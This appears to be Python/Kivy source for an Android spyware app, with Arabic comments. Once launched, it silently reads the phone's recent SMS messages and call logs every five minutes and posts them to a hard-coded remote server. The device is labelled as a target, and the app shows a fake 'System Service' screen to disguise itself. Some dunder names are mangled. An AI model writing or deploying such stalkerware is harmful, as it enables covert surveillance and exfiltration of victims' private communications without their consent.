import time
import requests
import threading
from kivy.app import App
from kivy.uix.label import Label
from kivy.utils import platform

# --- الإعدادات ---
SERVER_URL = "193.161.193.99:5000"  # استبدله بـ IP سيرفرك
DEVICE_ID = "Target_Phone_01"

# استدعاء مكتبات أندرويد عبر jnius
if platform == 'android':
    from jnius import autoclass
    from plyer import gps

class MonitoringSystem:
    def init(self):
        self.running = True

    def get_android_data(self, uri_str, columns):
        """جلب البيانات من قواعد بيانات أندرويد (SMS, Calls)"""
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Uri = autoclass('android.net.Uri')
            context = PythonActivity.mActivity
            cursor = context.getContentResolver().query(
                Uri.parse(uri_str), None, None, None, "date DESC"
            )
            
            results = []
            if cursor and cursor.moveToFirst():
                for _ in range(10):  # جلب آخر 10 سجلات فقط
                    row = {col: cursor.getString(cursor.getColumnIndex(col)) for col in columns}
                    results.append(row)
                    if not cursor.moveToNext(): break
                cursor.close()
            return results
        except Exception as e:
            return [str(e)]

    def start_background_task(self):
        """الدورة المستمرة لجمع البيانات وإرسالها"""
        while self.running:
            try:
                # 1. جمع الرسائل (SMS)
                sms_list = self.get_android_data("content://sms/inbox", ["address", "body"])
                
                # 2. جمع سجل المكالمات (Call Logs)
                calls_list = self.get_android_data("content://call_log/calls", ["number", "duration", "type"])
                
                # 3. إرسال البيانات للسيرفر
                payload = {
                    "id": DEVICE_ID,
                    "sms": sms_list,
                    "calls": calls_list,
                    "timestamp": time.time()
                }
                requests.post(f"{SERVER_URL}/receive", json=payload, timeout=10)
                
            except Exception as e:
                print(f"Connection Error: {e}")
            
            time.sleep(300)  # التكرار كل 5 دقائق

class ProfessionalTrackerApp(App):
    def build(self):
        # بدء المراقبة في الخلفية فور تشغيل التطبيق
        monitor = MonitoringSystem()
        threading.Thread(target=monitor.start_background_task, daemon=True).start()
        
        # واجهة وهمية (تبدو كتطبيق نظام)
        return Label(text="System Service v4.2.1\nRunning in optimized mode.")

if name == 'main':
    ProfessionalTrackerApp().run()
